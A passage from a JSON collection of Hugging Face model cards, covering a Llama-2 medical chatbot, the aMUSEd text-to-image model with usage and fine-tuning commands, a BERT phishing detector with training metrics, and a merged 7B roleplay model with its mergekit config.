the chatbot is able to answer questions about a variety of medical topics.\nThis is a sophisticated medical chatbot, developed using Llama-2 7B and Sentence Transformers. Powered by Langchain and Chainlit, This bot operates on a powerful CPU computer that boasts a minimum of\nOperating system: Linux, macOS, or Windows\nCPU: IntelÂ® Coreâ„¢ i3\nRAM: 8 GB\nDisk space: 7 GB\nGPU: None (CPU only)\nIt is still under development, but it has the potential to be a valuable tool for patients, healthcare professionals, and researchers.\nğŸš€ Quickstart\nOpen Git Bash.\nChange the current working directory to the location where you want the cloned directory.\nType git clone, and then paste the URL you copied earlier.\ngit clone https://github.com/ThisIs-Developer/Llama-2-GGML-Medical-Chatbot.git\nPress Enter to create your local clone.\n4. Install the pip packages in requirements.txt\npip install -r requirements.txt\nNow run it!\nchainlit run model.py -w\nğŸ“– ChatBot Conversession\nâ›“ï¸Chainlit ver. on #v1.0.1.dev20230913\nâš¡Streamlit ver. on #v2.0.1.dev20231230\nDEMO: ğŸ“½ï¸Conversession.vid.mp4->https://cdn-uploads.huggingface.co/production/uploads/64d8c442a4839890b2490db9/iI4t0lhjkCw3dDSvWQ4Jk.mp4",
    "amused/amused-256": "amused\n1. Usage\nText to image\nImage to image\nInpainting\n2. Performance\nMuse performance knobs\ntorch.compile\n3. Training\nFinetuning the 256 checkpoint\nFinetuning the 512 checkpoint\nStyledrop\n4. Acknowledgements\n5. Citation\namused\nImages cherry-picked from 512 and 256 models. Images are degraded to load faster. See ./assets/collage_full.png for originals\nğŸ“ƒ Paper: aMUSEd: An Open MUSE Reproduction\nModel\nParams\namused-256\n803M\namused-512\n808M\nAmused is a lightweight text to image model based off of the muse architecture. Amused is particularly useful in applications that require a lightweight and fast model such as generating many images quickly at once.\nThe diagram shows the training and inference pipelines for aMUSEd. aMUSEd consists\nof three separately trained components: a pre-trained CLIP-L/14 text encoder, a VQ-GAN, and a\nU-ViT. During training, the VQ-GAN encoder maps images to a 16x smaller latent resolution. The\nproportion of masked latent tokens is sampled from a cosine masking schedule, e.g. cos(r Â· Ï€\n2 )\nwith r âˆ¼ Uniform(0, 1). The model is trained via cross-entropy loss to predict the masked tokens.\nAfter the model is trained on 256x256 images, downsampling and upsampling layers are added, and\ntraining is continued on 512x512 images. During inference, the U-ViT is conditioned on the text\nencoderâ€™s hidden states and iteratively predicts values for all masked tokens. The cosine masking\nschedule determines a percentage of the most confident token predictions to be fixed after every\niteration. After 12 iterations, all tokens have been predicted and are decoded by the VQ-GAN into\nimage pixels.\n1. Usage\nText to image\n256x256 model\nimport torch\nfrom diffusers import AmusedPipeline\npipe = AmusedPipeline.from_pretrained(\n\"huggingface/amused-256\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"cowboy\"\nimage = pipe(prompt, generator=torch.Generator('cuda').manual_seed(8)).images[0]\nimage.save('text2image_256.png')\n512x512 model\nimport torch\nfrom diffusers import AmusedPipeline\npipe = AmusedPipeline.from_pretrained(\n\"huggingface/amused-512\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans n fp16\npipe = pipe.to(\"cuda\")\nprompt = \"summer in the mountains\"\nimage = pipe(prompt, generator=torch.Generator('cuda').manual_seed(2)).images[0]\nimage.save('text2image_512.png')\nImage to image\n256x256 model\nimport torch\nfrom diffusers import AmusedImg2ImgPipeline\nfrom diffusers.utils import load_image\npipe = AmusedImg2ImgPipeline.from_pretrained(\n\"huggingface/amused-256\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"apple watercolor\"\ninput_image = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/image2image_256_orig.png\"\n)\n.resize((256, 256))\n.convert(\"RGB\")\n)\nimage = pipe(prompt, input_image, strength=0.7, generator=torch.Generator('cuda').manual_seed(3)).images[0]\nimage.save('image2image_256.png')\n512x512 model\nimport torch\nfrom diffusers import AmusedImg2ImgPipeline\nfrom diffusers.utils import load_image\npipe = AmusedImg2ImgPipeline.from_pretrained(\n\"huggingface/amused-512\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"winter mountains\"\ninput_image = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/image2image_512_orig.png\"\n)\n.resize((512, 512))\n.convert(\"RGB\")\n)\nimage = pipe(prompt, input_image, generator=torch.Generator('cuda').manual_seed(15)).images[0]\nimage.save('image2image_512.png')\nInpainting\n256x256 model\nimport torch\nfrom diffusers import AmusedInpaintPipeline\nfrom diffusers.utils import load_image\nfrom PIL import Image\npipe = AmusedInpaintPipeline.from_pretrained(\n\"huggingface/amused-256\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"a man with glasses\"\ninput_image = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/inpainting_256_orig.png\"\n)\n.resize((256, 256))\n.convert(\"RGB\")\n)\nmask = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/inpainting_256_mask.png\"\n)\n.resize((256, 256))\n.convert(\"L\")\n)\nfor seed in range(20):\nimage = pipe(prompt, input_image, mask, generator=torch.Generator('cuda').manual_seed(seed)).images[0]\nimage.save(f'inpainting_256_{seed}.png')\n512x512 model\nimport torch\nfrom diffusers import AmusedInpaintPipeline\nfrom diffusers.utils import load_image\npipe = AmusedInpaintPipeline.from_pretrained(\n\"huggingface/amused-512\", variant=\"fp16\", torch_dtype=torch.float16\n)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"fall mountains\"\ninput_image = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/inpainting_512_orig.jpeg\"\n)\n.resize((512, 512))\n.convert(\"RGB\")\n)\nmask = (\nload_image(\n\"https://raw.githubusercontent.com/huggingface/amused/main/assets/inpainting_512_mask.png\"\n)\n.resize((512, 512))\n.convert(\"L\")\n)\nimage = pipe(prompt, input_image, mask, generator=torch.Generator('cuda').manual_seed(0)).images[0]\nimage.save('inpainting_512.png')\n2. Performance\nAmused inherits performance benefits from original muse.\nParallel decoding: The model follows a denoising schedule that aims to unmask some percent of tokens at each denoising step. At each step, all masked tokens are predicted, and some number of tokens that the network is most confident about are unmasked. Because multiple tokens are predicted at once, we can generate a full 256x256 or 512x512 image in around 12 steps. In comparison, an autoregressive model must predict a single token at a time. Note that a 256x256 image with the 16x downsampled VAE that muse uses will have 256 tokens.\nFewer sampling steps: Compared to many diffusion models, muse requires fewer samples.\nAdditionally, amused uses the smaller CLIP as its text encoder instead of T5 compared to muse. Amused is also smaller with ~600M params compared the largest 3B param muse model. Note that being smaller, amused produces comparably lower quality results.\nMuse performance knobs\nUncompiled Transformer + regular attention\nUncompiled Transformer + flash attention (ms)\nCompiled Transformer (ms)\nSpeed Up\n256 Batch Size 1\n594.7\n507.7\n212.1\n58%\n512 Batch Size 1\n637\n547\n249.9\n54%\n256 Batch Size 8\n719\n628.6\n427.8\n32%\n512 Batch Size 8\n1000\n917.7\n703.6\n23%\nFlash attention is enabled by default in the diffusers codebase through torch F.scaled_dot_product_attention\ntorch.compile\nTo use torch.compile, simply wrap the transformer in torch.compile i.e.\npipe.transformer = torch.compile(pipe.transformer)\nFull snippet:\nimport torch\nfrom diffusers import AmusedPipeline\npipe = AmusedPipeline.from_pretrained(\n\"huggingface/amused-256\", variant=\"fp16\", torch_dtype=torch.float16\n)\n# HERE use torch.compile\npipe.transformer = torch.compile(pipe.transformer)\npipe.vqvae.to(torch.float32)  # vqvae is producing nans in fp16\npipe = pipe.to(\"cuda\")\nprompt = \"cowboy\"\nimage = pipe(prompt, generator=torch.Generator('cuda').manual_seed(8)).images[0]\nimage.save('text2image_256.png')\n3. Training\nAmused can be finetuned on simple datasets relatively cheaply and quickly. Using 8bit optimizers, lora, and gradient accumulation, amused can be finetuned with as little as 5.5 GB. Here are a set of examples for finetuning amused on some relatively simple datasets. These training recipies are aggressively oriented towards minimal resources and fast verification -- i.e. the batch sizes are quite low and the learning rates are quite high. For optimal quality, you will probably want to increase the batch sizes and decrease learning rates.\nAll training examples use fp16 mixed precision and gradient checkpointing. We don't show 8 bit adam + lora as its about the same memory use as just using lora (bitsandbytes uses full precision optimizer states for weights below a minimum size).\nFinetuning the 256 checkpoint\nThese examples finetune on this nouns dataset.\nExample results:\nFull finetuning\nBatch size: 8, Learning rate: 1e-4, Gives decent results in 750-1000 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n8\n1\n8\n19.7 GB\n4\n2\n8\n18.3 GB\n1\n8\n8\n17.9 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 1e-4 \\\n--pretrained_model_name_or_path amused/amused-256 \\\n--instance_data_dataset  'm1guelpf/nouns' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 256 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'a pixel art character with square red glasses, a baseball-shaped head and a orange-colored body on a dark background' \\\n'a pixel art character with square orange glasses, a lips-shaped head and a red-colored body on a light background' \\\n'a pixel art character with square blue glasses, a microwave-shaped head and a purple-colored body on a sunny background' \\\n'a pixel art character with square red glasses, a baseball-shaped head and a blue-colored body on an orange background' \\\n'a pixel art character with square red glasses' \\\n'a pixel art character' \\\n'square red glasses on a pixel art character' \\\n'square red glasses on a pixel art character with a baseball-shaped head' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nFull finetuning + 8 bit adam\nNote that this training config keeps the batch size low and the learning rate high to get results fast with low resources. However, due to 8 bit adam, it will diverge eventually. If you want to train for longer, you will have to up the batch size and lower the learning rate.\nBatch size: 16, Learning rate: 2e-5, Gives decent results in ~750 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n16\n1\n16\n20.1 GB\n8\n2\n16\n15.6 GB\n1\n16\n16\n10.7 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 2e-5 \\\n--use_8bit_adam \\\n--pretrained_model_name_or_path amused/amused-256 \\\n--instance_data_dataset  'm1guelpf/nouns' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 256 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'a pixel art character with square red glasses, a baseball-shaped head and a orange-colored body on a dark background' \\\n'a pixel art character with square orange glasses, a lips-shaped head and a red-colored body on a light background' \\\n'a pixel art character with square blue glasses, a microwave-shaped head and a purple-colored body on a sunny background' \\\n'a pixel art character with square red glasses, a baseball-shaped head and a blue-colored body on an orange background' \\\n'a pixel art character with square red glasses' \\\n'a pixel art character' \\\n'square red glasses on a pixel art character' \\\n'square red glasses on a pixel art character with a baseball-shaped head' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nFull finetuning + lora\nBatch size: 16, Learning rate: 8e-4, Gives decent results in 1000-1250 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n16\n1\n16\n14.1 GB\n8\n2\n16\n10.1 GB\n1\n16\n16\n6.5 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 8e-4 \\\n--use_lora \\\n--pretrained_model_name_or_path amused/amused-256 \\\n--instance_data_dataset  'm1guelpf/nouns' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 256 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'a pixel art character with square red glasses, a baseball-shaped head and a orange-colored body on a dark background' \\\n'a pixel art character with square orange glasses, a lips-shaped head and a red-colored body on a light background' \\\n'a pixel art character with square blue glasses, a microwave-shaped head and a purple-colored body on a sunny background' \\\n'a pixel art character with square red glasses, a baseball-shaped head and a blue-colored body on an orange background' \\\n'a pixel art character with square red glasses' \\\n'a pixel art character' \\\n'square red glasses on a pixel art character' \\\n'square red glasses on a pixel art character with a baseball-shaped head' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nFinetuning the 512 checkpoint\nThese examples finetune on this minecraft dataset.\nExample results:\nFull finetuning\nBatch size: 8, Learning rate: 8e-5, Gives decent results in 500-1000 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n8\n1\n8\n24.2 GB\n4\n2\n8\n19.7 GB\n1\n8\n8\n16.99 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 8e-5 \\\n--pretrained_model_name_or_path amused/amused-512 \\\n--instance_data_dataset  'monadical-labs/minecraft-preview' \\\n--prompt_prefix 'minecraft ' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 512 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'minecraft Avatar' \\\n'minecraft character' \\\n'minecraft' \\\n'minecraft president' \\\n'minecraft pig' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nFull finetuning + 8 bit adam\nBatch size: 8, Learning rate: 5e-6, Gives decent results in 500-1000 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n8\n1\n8\n21.2 GB\n4\n2\n8\n13.3 GB\n1\n8\n8\n9.9 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 5e-6 \\\n--pretrained_model_name_or_path amused/amused-512 \\\n--instance_data_dataset  'monadical-labs/minecraft-preview' \\\n--prompt_prefix 'minecraft ' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 512 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'minecraft Avatar' \\\n'minecraft character' \\\n'minecraft' \\\n'minecraft president' \\\n'minecraft pig' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nFull finetuning + lora\nBatch size: 8, Learning rate: 1e-4, Gives decent results in 500-1000 steps\nBatch Size\nGradient Accumulation Steps\nEffective Total Batch Size\nMemory Used\n8\n1\n8\n12.7 GB\n4\n2\n8\n9.0 GB\n1\n8\n8\n5.6 GB\naccelerate launch training/training.py \\\n--output_dir <output path> \\\n--train_batch_size <batch size> \\\n--gradient_accumulation_steps <gradient accumulation steps> \\\n--learning_rate 1e-4 \\\n--pretrained_model_name_or_path amused/amused-512 \\\n--instance_data_dataset  'monadical-labs/minecraft-preview' \\\n--prompt_prefix 'minecraft ' \\\n--image_key image \\\n--prompt_key text \\\n--resolution 512 \\\n--mixed_precision fp16 \\\n--lr_scheduler constant \\\n--validation_prompts \\\n'minecraft Avatar' \\\n'minecraft character' \\\n'minecraft' \\\n'minecraft president' \\\n'minecraft pig' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 250 \\\n--gradient_checkpointing\nStyledrop\nStyledrop is an efficient finetuning method for learning a new style from a small number of images. It has an optional first stage to generate human picked additional training samples. The additional training samples can be used to augment the initial images. Our examples exclude the optional additional image selection stage and instead we just finetune on a single image.\nThis is our example style image:\n256\nExample results:\nLearning rate: 4e-4, Gives decent results in 1500-2000 steps\naccelerate launch ./training/training.py \\\n--output_dir <output path> \\\n--mixed_precision fp16 \\\n--report_to wandb \\\n--use_lora \\\n--pretrained_model_name_or_path amused/amused-256 \\\n--train_batch_size 1 \\\n--lr_scheduler constant \\\n--learning_rate 4e-4 \\\n--validation_prompts \\\n'A chihuahua walking on the street in [V] style' \\\n'A banana on the table in [V] style' \\\n'A church on the street in [V] style' \\\n'A tabby cat walking in the forest in [V] style' \\\n--instance_data_image './training/A mushroom in [V] style.png' \\\n--max_train_steps 10000 \\\n--checkpointing_steps 500 \\\n--validation_steps 100 \\\n--resolution 256\n512\nLearning rate: 1e-3, Lora alpha 1, Gives decent results in 1500-2000 steps\nExample results:\naccelerate launch ./training/training.py \\\n--output_dir ../styledrop \\\n--mixed_precision fp16 \\\n--report_to wandb \\\n--use_lora \\\n--pretrained_model_name_or_path amused/amused-512 \\\n--train_batch_size 1 \\\n--lr_scheduler constant \\\n--learning_rate 1e-3 \\\n--validation_prompts \\\n'A chihuahua walking on the street in [V] style' \\\n'A banana on the table in [V] style' \\\n'A church on the street in [V] style' \\\n'A tabby cat walking in the forest in [V] style' \\\n--instance_data_image './training/A mushroom in [V] style.png' \\\n--max_train_steps 100000 \\\n--checkpointing_steps 500 \\\n--validation_steps 100 \\\n--resolution 512 \\\n--lora_alpha 1\n4. Acknowledgements\nSuraj led training. William led data and supported training. Patrick supported both training and\ndata and provided general guidance. Robin trained the VQ-GAN and provided general guidance.\nAlso, immense thanks to community contributor Isamu Isozaki for helpful discussions and code\ncontributions.\n5. Citation\n@misc{patil2024amused,\ntitle={aMUSEd: An Open MUSE Reproduction},\nauthor={Suraj Patil and William Berman and Robin Rombach and Patrick von Platen},\nyear={2024},\neprint={2401.01808},\narchivePrefix={arXiv},\nprimaryClass={cs.CV}\n}",
    "ealvaradob/bert-finetuned-phishing": "BERT FINETUNED ON PHISHING DETECTION\nModel description\nMotivation and Purpose\nTraining hyperparameters\nTraining results\nFramework versions\nBERT FINETUNED ON PHISHING DETECTION\nThis model is a fine-tuned version of bert-large-uncased on an phishing dataset,\ncapable of detecting phishing in its four most common forms: URLs, Emails, SMS messages and even websites.\nIt achieves the following results on the evaluation set:\nLoss: 0.1953\nAccuracy: 0.9717\nPrecision: 0.9658\nRecall: 0.9670\nFalse Positive Rate: 0.0249\nModel description\nBERT is a transformers model pretrained on a large corpus of English data in a self-supervised fashion.\nThis means it was pretrained on the raw texts only, with no humans labelling them in any way (which is why\nit can use lots of publicly available data) with an automatic process to generate inputs and labels from\nthose texts.\nThis model has the following configuration:\n24-layer\n1024 hidden dimension\n16 attention heads\n336M parameters\nMotivation and Purpose\nPhishing is one of the most frequent and most expensive cyber-attacks according to several security reports.\nThis model aims to efficiently and accurately prevent phishing attacks against individuals and organizations.\nTo achieve it, BERT was trained on a diverse and robust dataset containing: URLs, SMS Messages, Emails and\nWebsites, which allows the model to extend its detection capability beyond the usual and to be used in various\ncontexts.\nTraining hyperparameters\nThe following hyperparameters were used during training:\nlearning_rate: 2e-05\ntrain_batch_size: 16\neval_batch_size: 16\nseed: 42\noptimizer: Adam with betas=(0.9,0.999) and epsilon=1e-08\nlr_scheduler_type: linear\nnum_epochs: 4\nTraining results\nTraining Loss\nEpoch\nStep\nValidation Loss\nAccuracy\nPrecision\nRecall\nFalse Positive Rate\n0.1487\n1.0\n3866\n0.1454\n0.9596\n0.9709\n0.9320\n0.0203\n0.0805\n2.0\n7732\n0.1389\n0.9691\n0.9663\n0.9601\n0.0243\n0.0389\n3.0\n11598\n0.1779\n0.9683\n0.9778\n0.9461\n0.0156\n0.0091\n4.0\n15464\n0.1953\n0.9717\n0.9658\n0.9670\n0.0249\nFramework versions\nTransformers 4.34.1\nPytorch 2.1.1+cu121\nDatasets 2.14.6\nTokenizers 0.14.1",
    "SanjiWatsuki/Loyal-Toppy-Bruins-Maid-7B-DARE": "Description\nThe sauce\nPrompt template: Custom format, or Alpaca\nCustom format:\nAlpaca:\nDescription\nThis repository hosts FP16 files for Loyal-Toppy-Bruins-Maid-7B, a 7B model aimed at having engaging RP with solid character card adherence and being a smart cookie at the same time.\nIts foundation is Starling-LM-7B-alpha, notable for its performance in the LMSYS Chatbot Arena, even surpassing GPT-3.5-Turbo-1106. The model incorporates rwitz/go-bruins-v2, a Q-bert/MetaMath-Cybertron-Starling derivative with Alpaca RP data tuning.\nThe other foundational model is chargoddard/loyal-piano-m7, chosen for its strong RP performance and Alpaca format training, with a diverse dataset including PIPPA, rpbuild, and LimaRP.\nUndi95/Toppy-M-7B, known for its creativity, brings in useful RP data from various sources. It ranks first among 7B models on OpenRouter for a good reason.\nNeverSleep/Noromaid-7b-v0.1.1, a Mistral finetune with unique RP data not present in other models, was also added for bringing in a unique RP dataset and being a well-regarded RP model.\nThe models were merged using the DARE ties method, with a targeted 1.2 absolute weight and high density (0.5-0.6), as discussed in the MergeKit GitHub Repo.\nCurrently, this model ranks at the top of my personal RP unit test benchmark and scored a very solid 20 on lilblam's LLM Logic Test. My first impressions of it for RPing are very good but, admittedly, this model came out of the oven today so I haven't played it with it too much ğŸ˜Š\nThe sauce\nmodels: # Top-Loyal-Bruins-Maid-DARE-7B_v2\n- model: mistralai/Mistral-7B-v0.1\n# no parameters necessary for base model\n- model: rwitz/go-bruins-v2 # MetamathCybertronStarling base\nparameters:\nweight: 0.5\ndensity: 0.6\n- model: chargoddard/loyal-piano-m7 # Pull in some PIPPA/LimaRP/Orca/rpguild\nparameters:\nweight: 0.5\ndensity: 0.6\n- model: Undi95/Toppy-M-7B\nparameters:\nweight: 0.1\ndensity: 0.5\n- model: NeverSleep/Noromaid-7b-v0.1.1\nparameters:\nweight: 0.1\ndensity: 0.5\nmerge_method: dare_ties\nbase_model: mistralai/Mistral-7B-v0.1\nparameters:\nnormalize: false\nint8_mask: true\ndtype: bfloat16\nPrompt template: Custom format, or Alpaca\nCustom format:\nI found the best SillyTavern results from using the Noromaid template.\nSillyTavern config files: Context, Instruct.\nOtherwise, I tried to ensure that all of the underlying merged models were Alpaca favored.\nAlpaca:\nBelow is an instruction that describes a task. Write a response that appropriately completes the request.\n### Instruction:\n{prompt}\n### Response:"
}